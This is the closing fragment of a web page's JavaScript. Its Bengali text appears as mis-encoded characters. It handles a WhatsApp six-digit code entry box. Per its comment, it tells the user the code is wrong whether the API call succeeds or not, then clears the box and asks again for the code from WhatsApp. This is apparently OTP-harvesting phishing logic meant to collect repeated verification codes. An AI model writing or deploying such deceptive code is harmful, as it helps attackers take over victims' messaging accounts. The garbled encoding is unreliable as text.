    // API ‡¶∏‡¶´‡¶≤ ‡¶π‡ßã‡¶ï ‡¶¨‡¶æ ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•, ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶ï‡ßá ‡¶≠‡ßÅ‡¶≤ ‡¶ï‡ßã‡¶° ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá (‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡ßá‡¶∂ ‡¶Ö‡¶®‡ßÅ‡¶∏‡¶æ‡¶∞‡ßá)

    // ‡ßß. ‡¶≠‡ßÅ‡¶≤ ‡¶ï‡ßã‡¶° ‡¶∏‡¶ø‡¶Æ‡ßÅ‡¶≤‡ßá‡¶∂‡¶® ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú:
    messageStatus.textContent = "‚ùå ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á‡¶ï‡¶∞‡¶£ ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá: ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡ß¨ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡¶ü‡¶ø ‡¶≠‡ßÅ‡¶≤‡•§ ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶∏‡¶†‡¶ø‡¶ï ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶®‡•§";
    messageStatus.style.color = '#DC3545';

    // ‡ß®. ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ñ‡¶æ‡¶≤‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶è‡¶¨‡¶Ç ‡¶∞‡¶ø‡¶∏‡ßá‡¶ü
    otpBox.value = "";
    otpBox.disabled = false;
    isSubmitting = false;

    // ‡ß©. ‡¶ï‡¶ø‡¶õ‡ßÅ‡¶ï‡ßç‡¶∑‡¶£ ‡¶™‡¶∞ ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶∏‡ßç‡¶¨‡¶æ‡¶≠‡¶æ‡¶¨‡¶ø‡¶ï ‡¶Ö‡¶¨‡¶∏‡ßç‡¶•‡¶æ‡¶Ø‡¶º ‡¶´‡¶ø‡¶∞‡ßá ‡¶Ø‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ 
    setTimeout(() => {
      messageStatus.textContent = "‚ö†Ô∏è WhatsApp ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶∏‡¶†‡¶ø‡¶ï ‡ß¨ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶¨‡¶∏‡¶æ‡¶®‡•§";
    }, 4000); 

  });
}
</script>
</body>
</html>
